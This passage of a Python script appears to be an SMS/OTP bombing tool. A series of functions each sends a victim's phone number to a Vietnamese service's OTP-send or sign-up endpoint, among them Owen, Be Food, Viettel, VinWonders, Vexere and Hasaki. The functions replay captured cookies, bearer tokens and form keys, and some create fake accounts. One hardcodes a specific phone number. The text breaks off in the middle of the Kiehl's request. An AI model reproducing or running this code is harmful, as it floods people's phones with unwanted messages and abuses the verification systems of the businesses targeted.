        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=mVMv3IDcYvxwDHNH; form_key=mVMv3IDcYvxwDHNH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; PHPSESSID=d040280e2517e2280569a7db522d5988; mage-messages=; section_data_ids=%7B%22insiderSection%22%3A1721578899%7D; private_content_version=a38eb3ce2c465d1e78c1d0d15bd51ee4',
        'origin': 'https://owen.vn',
        'priority': 'u=1, i',
        'referer': 'https://owen.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'mVMv3IDcYvxwDHNH',
    }

    try:
        response = requests.post('https://owen.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OWEN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OWEN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodhubzl():
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def heyu():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-version': '70814',
        'authorization': '8996e28efe64d52bcea12d5165ebae17',
        'content-type': 'application/json',
        'origin': 'https://book.heyu.vn',
        'priority': 'u=1, i',
        'referer': 'https://book.heyu.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'regionName': None,
        'nativeVersion': 2027,
        'reqT': 1721580987444,
    }

    try:
        response = requests.post('https://book.heyu.vn/api/sms/send-code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HEYU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HEYU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vttelecom():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'lang': 'vi',
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp', params=params, headers=headers)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietair():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://vietair.com.vn/khach-hang-than-quen/dang-ky',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    try:
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETAIR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vexere():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIzNzA2OTM5fQ.ZPwjlOKyhe9MFkIAUYJZHNgKV-aDx9VG8L6HuqW9DLw',
        'content-type': 'application/json',
        'origin': 'https://vexere.com',
        'priority': 'u=1, i',
        'referer': 'https://vexere.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': '+840357156322',
        'lang': 'vi-VN',
    }

    try:
        response = requests.post('https://user-profile-service.vexere.com/v2/auth/send_otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VEXERE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VEXERE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def atadi():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.atadi.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.atadi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'phone',
        'phone': sdt,
        'lastMessage': 'NEW_MEMBER_UI_2',
    }

    try:
        response = requests.post('https://www.atadi.vn/addon/tds/register2', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ATADI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ATADI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def etrip4u():
    cookies = {
        'language': 'vi',
        'departureCityHolder': 'Ho%2520Chi%2520Minh%2520(SGN)',
        'departureCity': 'SGN',
        'arrivalCityHolder': 'Ha%2520Noi%2520(HAN)',
        'arrivalCity': 'HAN',
        'journeyType': '1',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'language=vi; departureCityHolder=Ho%2520Chi%2520Minh%2520(SGN); departureCity=SGN; arrivalCityHolder=Ha%2520Noi%2520(HAN); arrivalCity=HAN; journeyType=1; G_ENABLED_IDPS=google',
        'origin': 'https://www.etrip4u.com',
        'priority': 'u=1, i',
        'referer': 'https://www.etrip4u.com/Account/MemberRegister',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'Email': '',
        'Phone': sdt,
        'FullName': 'quoc tien huy',
        'Username': sdt,
        'Password': '123123123',
        'ConfirmPassword': '123123123',
    }

    try:
        response = requests.post('https://www.etrip4u.com/Account/MemberRegister', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ETRIP4U | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ETRIP4U | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tinyworld():
    cookies = {
        'connect.sid': 's%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com/dia-diem-va-gia-ve.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com/dia-diem-va-gia-ve.html',
        'phone': sdt,
    }

    try:
        response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TINYWORLD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TINYWORLD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def chudu24():
    cookies = {
        'CheckInDate': '23/07/2024',
        'CheckOutDate': '24/07/2024',
        'pt_source': 'adwords',
        'cf_clearance': 'dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg',
        'connect.sid': 's%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU',
        'timePopup': '297000',
        'openPopupMember': '',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CheckInDate=23/07/2024; CheckOutDate=24/07/2024; pt_source=adwords; cf_clearance=dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg; connect.sid=s%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU; timePopup=297000; openPopupMember=',
        'origin': 'https://www.chudu24.com',
        'priority': 'u=0, i',
        'referer': 'https://www.chudu24.com/tai-khoan/dang-ky?ReturnUrl=%2F%2Fwww.chudu24.com%2Ftai-khoan%2Fdang-nhap?ReturnUrl=https%3A%2F%2Fwww.chudu24.com%2F%3Fpt_source%3Dadwords%26pt_campaign%3D%26pt_adgroupid%3D8399610561%26pt_device%3Dc%26pt_devicemodel%3D%26gad_source%3D1%26gclid%3DCjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'ReturnUrl': '//www.chudu24.com/tai-khoan/dang-nhap?ReturnUrl=https://www.chudu24.com/?pt_source=adwords&pt_campaign=&pt_adgroupid=8399610561&pt_device=c&pt_devicemodel=&gad_source=1&gclid=CjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'typeMember': 'CANHAN',
        'email': sdt,
        'password': '123123',
    }

    try:
        response = requests.post('https://www.chudu24.com/tai-khoan/ajax-dang-ky-web', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHUDU24 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CHUDU24 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def sojo():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Authorization': '',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://sojohotels.com',
        'Referer': 'https://sojohotels.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'lang': 'vi',
    }

    json_data = {
        'phone': sdt,
        'fullName': 'ko co ten',
        'email': 'fasfa@gmail.com',
        'password': '1234',
        'nationalityCode': '+84',
        'nationalityAlphaCode': 'VN',
        'isReceiveMessage': False,
        'isLoyaltyUser': True,
        'isPolicy': True,
        'isSubmit': False,
        'deviceToken': None,
        'osType': 'web',
    }

    try:
        response = requests.post('https://api.sojohotels.com/account/api/v2/user/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SOJO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOJO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'sessionChecked': '1721624886',
        'HASAKI_SESSID': 'b5a41e810a240f4d2446e6241c78407a',
        'form_key': 'b5a41e810a240f4d2446e6241c78407a',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'ofu3g6vsn92b0iqiu4i28e82s0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kiehls():
    cookies = {
        'dwac_a5b49a2c3a0f1f7ca3ef9715a5': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true',
        'cqcid': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        'cquid': '||',
        'sid': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo',
        'dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        '__cq_dnt': '0',
        'dw_dnt': '0',
        'dwsid': '766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==',
        '__cf_bm': 'XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw',
        'cf_clearance': 'oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q',
        'tracking': '%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'dwac_a5b49a2c3a0f1f7ca3ef9715a5=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true; cqcid=bclcwbad9uTM4EsEYxVq4hk5mq; cquid=||; sid=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo; dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd=bclcwbad9uTM4EsEYxVq4hk5mq; __cq_dnt=0; dw_dnt=0; dwsid=766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==; __cf_bm=XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw; cf_clearance=oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q; tracking=%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
        'origin': 'https://www.kiehls.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kiehls.com.vn/vi_VN/account-login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'ajax': 'true',
    }

    data = {
        'cellularPhone': sdt,
    }

    try:
        response = requests.post(
